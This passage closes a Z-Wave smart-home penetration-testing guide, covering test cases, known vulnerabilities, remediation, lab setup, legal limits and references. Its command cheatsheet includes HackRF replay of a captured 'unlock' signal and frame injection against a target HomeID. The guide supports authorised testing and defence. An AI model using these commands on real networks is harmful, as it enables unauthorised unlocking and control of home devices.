| TC-012 | Replay | Raw RF Signal Replay | High | HackRF, hackrf_transfer | None |
| TC-013 | Replay | S2 Anti-Replay Verification | Info | Zniffer, HackRF | None |
| TC-014 | DoS | S0 NonceGet DoS Flood | High | Custom Python, HackRF | None |
| TC-015 | DoS | S2 SPAN Desynchronization | Medium | Custom Python, HackRF | None |
| TC-016 | DoS | Battery Drain Attack | Medium | Scapy-radio | None |
| TC-017 | Firmware | Unsigned OTA Acceptance | Critical | Z-Wave PC Controller | Controller access |
| TC-018 | Firmware | Firmware Downgrade | High | Z-Wave PC Controller | Controller access |
| TC-019 | Hardware | Debug Interface Lock | High | J-Link | Physical access |
| TC-020 | Hardware | NVRAM Key Extraction | Critical | CH341A, flashrom | Physical access |
| TC-021 | Physical | Traffic Pattern Analysis | Medium | RTL-SDR, waving-z | None |
| TC-022 | Physical | RF Coexistence Testing | Low | Spectrum analyzer | None |
| TC-023 | Gateway | Hub Web Interface Auth | High | Burp Suite, nikto | Network access |
| TC-024 | Gateway | MQTT Broker Authentication | High | mosquitto | Network access |
| TC-025 | Gateway | Z/IP Gateway DTLS | Medium | testssl.sh | Network access |
| TC-026 | Gateway | API Privilege Escalation | High | Burp Suite, curl | Partial auth |
| TC-027 | ZWLR | ZWLR Passive Interception | Medium | WSTK Zniffer | None |
| TC-028 | ZWLR | ZWLR S2 Downgrade | High | EZ-Wave, HackRF | Proximity |
| TC-029 | ZWLR | ZWLR Node Exhaustion | Low | Z-Wave JS | Controller access |

---

## 19. CVEs, Known Vulnerabilities & Research

### 19.1 Published Vulnerabilities & Research

| ID / Name | Year | Severity | Description | Reference |
|-----------|------|---------|-------------|-----------|
| Z-Shave | 2018 | High | S2→S0 downgrade via unauthenticated NIF | Pen Test Partners |
| S0 Zero-Key Vulnerability | 2013 | Critical | Network key transmitted with all-zero encryption | SensePost/Lstefanko |
| S0 NonceGet DoS | 2020 | High | Gateway DoS via NonceGet flooding with spoofed NodeID | Arxiv 2001.08497 |
| S2 CTR_DRBG Desynch | 2022 | Medium | S2 nonce desynchronization via spoofed NonceGet | Arxiv 2205.00781 |
| SmartStart DSK Exposure | 2019 | Medium | Physical DSK label enables unauthorized inclusion | Z-Wave Alliance |
| Routing Table Manipulation | 2016 | Medium | EZ-Wave demonstrated routing disruption at ShmooCon | Hall & Ramsey |
| OTA Update Unsigned | Various | Critical | Devices accepting unsigned firmware | Multiple vendors |
| NVRAM Key Storage | Various | Critical | Network keys recoverable from physical device | Multiple researchers |

### 19.2 CVE Searches for Z-Wave

```bash
# Search NVD for Z-Wave CVEs
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=z-wave" | \
  python3 -m json.tool | grep -E "(cveId|description)"

# Vendor-specific searches:
# Silicon Labs: https://www.silabs.com/support/product-security
# Z-Wave Alliance: https://z-wavealliance.org/security-advisories/
```

### 19.3 Key Research Papers

1. **"Riding the Z-Wave" (2015)** — Insinuator.net; foundational Z-Wave attack research
2. **"Bringing SDR to the Penetration Testing Community" (Black Hat 2014)** — Scapy-radio introduction; Z-Wave as case study
3. **"EZ-Wave: Tools for Evaluating and Exploiting Z-Wave Networks" (ShmooCon 2016)** — Hall & Ramsey; complete Z-Wave pentest framework
4. **"Z-Shave: Exploiting Z-Wave Downgrade Attacks" (2018)** — Pen Test Partners; S2 downgrade attack
5. **"Crushing the Wave: New Z-Wave Vulnerabilities Exposed" (2020)** — Arxiv 2001.08497; DoS attacks
6. **"S0-No-More: A Z-Wave NonceGet Denial of Service Attack" (2022)** — Arxiv 2205.00781; S2 desynchronization

---

## 20. Reporting & Remediation Guidance

### 20.1 Risk Rating Framework

Use CVSS v3.1 base scores with Z-Wave-specific adjustments:

**Attack Vector adjustment for Z-Wave:**
- Passive sniffing from 100m: Adjacent Network (A)
- Injection requiring transmitter at 10m: Adjacent Network (A)
- Physical access required: Physical (P)

**Example CVSS calculation for S0 Key Interception:**
```
AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
AV=Adjacent, AC=High (only during pairing), PR=None, UI=Required (user must pair)
= CVSS 7.5 (High)
```

### 20.2 Remediation Priority Matrix

| Finding | Priority | Remediation |
|---------|---------|-------------|
| S0 devices in network | CRITICAL | Replace with S2-certified devices |
| Unencrypted actuator CCs | CRITICAL | Enable S2 Access Control for all actuators |
| S2→S0 downgrade possible | HIGH | Enforce S2-only inclusion; alert on fallback |
| Unauthenticated MQTT | HIGH | Enable MQTT auth + TLS |
| Hub web interface weak auth | HIGH | MFA; strong passwords; HTTPS |
| Unsigned firmware updates | HIGH | Enforce firmware signature verification |
| Debug interfaces unlocked | HIGH | Enable read protection in production builds |
| NVRAM key not hardware-protected | MEDIUM | Implement hardware security element |
| DSK label accessible | MEDIUM | Remove/protect physical DSK label post-inclusion |
| Traffic metadata visible | LOW | Accept as Z-Wave inherent limitation |

### 20.3 Report Structure for Z-Wave Assessments

```markdown
1. Executive Summary
   - Business impact of findings
   - Risk rating (Critical/High/Medium/Low)
   - Key recommendations

2. Scope and Methodology
   - HomeIDs in scope
   - Testing locations/windows
   - Tools and frameworks used
   - Phase-by-phase methodology

3. Findings (per vulnerability)
   - TC ID reference
   - Technical description
   - Evidence (packet captures, screenshots)
   - CVSS score and rationale
   - Proof of concept (steps to reproduce)
   - Business impact
   - Remediation recommendation
   - References (RFC, CVE, research papers)

4. Network Map
   - Topology diagram with NodeIDs
   - Security levels per device
   - Identified vulnerabilities per node

5. Appendices
   - Raw packet captures (redacted if sensitive)
   - Tool output logs
   - Device inventory and firmware versions
```

---

## 21. Lab Setup Guide

### 21.1 Recommended Home Lab Configuration

```
┌─────────────────────────────────────────────────────────────┐
│                   Z-WAVE PENTEST LAB                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Raspberry Pi 4 + RaZberry Shield (Controller)             │
│  │                                                          │
│  ├── Target Devices (buy for testing):                      │
│  │   ├── Z-Wave S0 door lock (Yale, Schlage older model)   │
│  │   ├── Z-Wave S2 smart lock (Yale Conexis, Schlage BE489) │
│  │   ├── Z-Wave smart switch (Aeotec Smart Switch 7)        │
│  │   └── Z-Wave motion sensor (Fibaro Motion Sensor)        │
│  │                                                          │
│  └── Attack Station (Kali Linux):                           │
│      ├── HackRF One (injection + reception)                 │
│      ├── RTL-SDR v4 (passive monitoring)                    │
│      ├── YARD Stick One (sub-1GHz specialized)             │
│      └── UZB-7 stick (legitimate controller testing)        │
│                                                             │
│  Faraday cage or RF-shielded enclosure recommended          │
└─────────────────────────────────────────────────────────────┘
```

### 21.2 Kali Linux Setup

```bash
# Update and install base dependencies
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y gnuradio gr-osmosdr hackrf rtl-sdr \
  python3 python3-pip libusb-1.0-0-dev cmake git

# Install HackRF tools
sudo apt-get install -y hackrf
hackrf_info    # Test HackRF connection

# Install RTL-SDR
sudo apt-get install -y rtl-sdr
rtl_test -t    # Test RTL-SDR connection

# Install Scapy with Z-Wave support
pip3 install scapy
python3 -c "from scapy.contrib.automotive.someip import *"  # Test

# Clone and install EZ-Wave
git clone https://github.com/AFITWiSec/EZ-Wave
cd EZ-Wave && sudo ./install.sh

# Clone waving-z
git clone https://github.com/baol/waving-z
cd waving-z && mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release && cmake --build .

# Install Z-Wave JS UI via Docker
docker pull zwavejs/zwave-js-ui:latest

# Install Home Assistant for network visualization
docker pull homeassistant/home-assistant:stable
```

### 21.3 Wireshark Z-Wave Configuration

```
1. Open Wireshark
2. Go to Edit → Preferences → Protocols → Z-Wave
3. Enter captured S0 network key (32 hex characters)
4. Enable: "Try to decrypt S0 messages"
5. Apply and OK
6. Open .pcap file from Zniffer export
7. Filter: zwave || zwave_s0 || zwave_s2
```

---

## 22. Legal & Ethical Framework

### 22.1 Relevant Legal Frameworks

**United States:**
- **Computer Fraud and Abuse Act (CFAA) 18 U.S.C. § 1030:** Unauthorized computer access — get explicit written permission
- **Electronic Communications Privacy Act (ECPA):** Protects wireless communications — testing requires authorization
- **FCC Part 15:** Z-Wave devices are unlicensed under Part 15 — testing on your own equipment in your own space is generally permitted; jamming public frequencies is ILLEGAL under 47 U.S.C. § 333
- **FCC Part 97:** Amateur radio — does not authorize Z-Wave testing

**European Union:**
- **GDPR:** Traffic captures containing personal data have data protection obligations
- **NIS2 Directive:** Applies to critical infrastructure using IoT
- **Radio Equipment Directive (RED):** Governs Z-Wave device compliance in EU

**Key principle:** Authorization must be explicit, documented, and from the rightful owner of the network and all devices in it.

### 22.2 Responsible Disclosure

If vulnerabilities are found in Z-Wave devices during authorized testing:
1. Document findings with technical evidence
2. Contact manufacturer via security@[vendor].com or security disclosure page
3. Allow 90-day disclosure window (CERT/CC standard)
4. Report to Z-Wave Alliance: security@z-wavealliance.org
5. For Silicon Labs protocol vulnerabilities: https://www.silabs.com/support/product-security
6. Consider CVE assignment via MITRE

### 22.3 Testing Scope Limitations

| Activity | Legal Status | Notes |
|----------|-------------|-------|
| Passive RF sniffing (own home) | ✅ Generally legal | Z-Wave at sub-1 GHz is not specifically protected from passive capture |
| Active injection (own devices) | ✅ Legal with owner permission | Must own or have written permission |
| Jamming | ❌ ILLEGAL | FCC § 333; illegal in all jurisdictions |
| Testing neighbor's Z-Wave | ❌ ILLEGAL | CFAA violation |
| Testing commercial property | ⚠️ Requires written authorization | Security assessment contract needed |
| Physical device modification | ✅ Legal (own device) | Warranty voiding; possible import regulations |

---

## 23. References & Trusted Sources

### Official Documentation
- Z-Wave Alliance Specification: https://z-wavealliance.org/z-wave-specification/
- Z-Wave 2024B Announcement: https://z-wavealliance.org/exploring-the-z-wave-2024b-specification-advancing-smart-home-and-iot-innovation/
- Silicon Labs Z-Wave SDK: https://www.silabs.com/developers/z-wave
- Silicon Labs Product Security: https://www.silabs.com/support/product-security
- Z-Wave Certified Products Database: https://products.z-wavealliance.org
- Z-Wave JS Documentation: https://zwave-js.github.io/node-zwave-js/

### Security Research (Peer-Reviewed & Conference)
- Z-Shave (Pen Test Partners, 2018): https://www.pentestpartners.com/security-blog/z-shave-exploiting-z-wave-downgrade-attacks/
- EZ-Wave (AFITWiSec, ShmooCon 2016): https://github.com/AFITWiSec/EZ-Wave
- Scapy-Radio (Black Hat USA 2014): https://github.com/BastilleResearch/scapy-radio
- Crushing the Wave (Arxiv, 2020): https://arxiv.org/pdf/2001.08497
- S0-No-More (Arxiv, 2022): https://arxiv.org/pdf/2205.00781
- Bishop Fox Z-Wave Zniffer Setup: https://bishopfox.com/blog/set-up-zniffer-for-z-wave
- GIAC Security Assessment Paper: https://www.giac.org/paper/gsec/35267/security-assessment-z-wave-devices-replay-attack-vulnerability/139847
- DrZWave (Z-Wave expert blog): https://drzwave.blog/

### GitHub Repositories
- EZ-Wave: https://github.com/AFITWiSec/EZ-Wave
- Scapy-Radio (Bastille): https://github.com/BastilleResearch/scapy-radio
- Waving-Z: https://github.com/baol/waving-z
- OpenSecurityResearch ZWave POC: https://github.com/OpenSecurityResearch/ZWave
- node-zwave-js: https://github.com/zwave-js/node-zwave-js
- Z-Wave JS UI: https://github.com/zwave-js/zwave-js-ui
- HackRF: https://github.com/mossmann/hackrf
- RTL-Zwave: https://github.com/andersesbensen/rtl-zwave
- OpenZWave (legacy): https://github.com/OpenZWave/open-zwave
- rfcat (YARD Stick One): https://github.com/atlas0fd00m/rfcat
- URH (Universal Radio Hacker): https://github.com/jopohl/urh

### Books
- *IoT Penetration Testing Cookbook* — O'Reilly (Z-Wave chapter): https://www.oreilly.com/library/view/iot-penetration-testing/9781787280571/
- *The IoT Hacker's Handbook* — Aditya Gupta, Apress
- *Hacking Connected Cars* — Alissa Knight

### Training & Labs
- SANS FOR585: Smartphone Forensics (includes IoT/Z-Wave)
- Offensive Security courses: https://www.offensive-security.com
- Practical IoT Hacking: https://nostarch.com/practical-iot-hacking

---

## Appendix A — Quick Reference Command Cheatsheet

```bash
# ============================================================
# Z-WAVE PENTEST QUICK REFERENCE COMMANDS
# ============================================================

# --- PASSIVE SNIFFING ---
# RTL-SDR capture (EU 868 MHz)
rtl_sdr -f 868420000 -s 2000000 -g 40 - | ./wave-in -u

# RTL-SDR capture (US 908 MHz)
rtl_sdr -f 908420000 -s 2000000 -g 40 - | ./wave-in -u

# HackRF capture raw IQ
hackrf_transfer -r capture.cs8 -f 908420000 -s 2000000 -l 32 -g 40

# --- ACTIVE SCANNING ---
# EZ-Wave passive stumbler (60s)
python ezstumbler.py -p -t 60

# EZ-Wave active scan
python ezstumbler.py -a -t 60 --homeid 0xTARGEThomeid

# EZ-Wave device recon
python ezrecon.py --homeid 0xTARGEThomeid --nodeid 5 -t 30

# --- FRAME TRANSMISSION (HackRF) ---
# Craft Z-Wave BASIC SET ON (unencrypted) with waving-z
./wave-out -p 'HomeID(4B) SrcNode FCtl Len DstNode 20 01 FF' > frame.cs8
hackrf_transfer -t frame.cs8 -f 908420000 -s 2000000 -x 40

# --- REPLAY ATTACK ---
# Capture specific sequence
hackrf_transfer -r unlock.cs8 -f 908420000 -s 2000000 -l 32 -g 40
# Replay sequence
hackrf_transfer -t unlock.cs8 -f 908420000 -s 2000000 -x 40

# --- GATEWAY/HUB TESTING ---
# Z-Wave JS docker
docker run -it -p 8091:8091 --device=/dev/ttyUSB0 zwavejs/zwave-js-ui

# MQTT listener
mosquitto_sub -h 192.168.1.X -p 1883 -t "zwave/#" -v

# Hub discovery
nmap -p 8123,8080,443,80,4123 192.168.1.0/24

# --- FIRMWARE ANALYSIS ---
# Binwalk extract
binwalk -e firmware.gbl

# JTAG connect (J-Link)
JLinkExe -device EFR32ZG14P831 -if SWD -speed 4000

# Firmwalker scan
./firmwalker.sh firmware_dir/
```

---

## Appendix B — Z-Wave Command Class Hex Reference (Security Testing)

```
0x20 COMMAND_CLASS_BASIC              ← Often unencrypted, test for direct control
0x25 COMMAND_CLASS_SWITCH_BINARY      ← Smart plugs, lights
0x26 COMMAND_CLASS_SWITCH_MULTILEVEL  ← Dimmers
0x30 COMMAND_CLASS_SENSOR_BINARY      ← Door/window sensors
0x40 COMMAND_CLASS_THERMOSTAT_MODE    ← HVAC
0x43 COMMAND_CLASS_THERMOSTAT_SETPOINT
0x60 COMMAND_CLASS_MULTI_CHANNEL      ← Multi-endpoint devices
0x62 COMMAND_CLASS_DOOR_LOCK          ← ⚠️ HIGH VALUE - require S2 Access Control
0x63 COMMAND_CLASS_USER_CODE          ← PIN management
0x71 COMMAND_CLASS_NOTIFICATION       ← Alarm/security events
0x72 COMMAND_CLASS_MANUFACTURER_SPECIFIC ← Unencrypted - reveals device info
0x7A COMMAND_CLASS_FIRMWARE_UPDATE_MD ← OTA updates - check for signing
0x80 COMMAND_CLASS_BATTERY            ← Battery level
0x83 COMMAND_CLASS_USER_CREDENTIAL    ← 2024A - new credential management
0x85 COMMAND_CLASS_ASSOCIATION        ← Device grouping
0x86 COMMAND_CLASS_VERSION            ← Unencrypted - reveals firmware versions
0x87 COMMAND_CLASS_INDICATOR          ← UI indicators
0x98 COMMAND_CLASS_SECURITY           ← S0 encapsulation ⚠️ LEGACY/WEAK
0x9F COMMAND_CLASS_SECURITY_2         ← S2 encapsulation ✅ CURRENT
```

---

*Document Version: 1.0 | Date: March 2026 | Based on Z-Wave Specification 2024B*  
*Intended for authorized security researchers and penetration testers only*  
*All research cited is from publicly disclosed, peer-reviewed, and conference-presented sources*
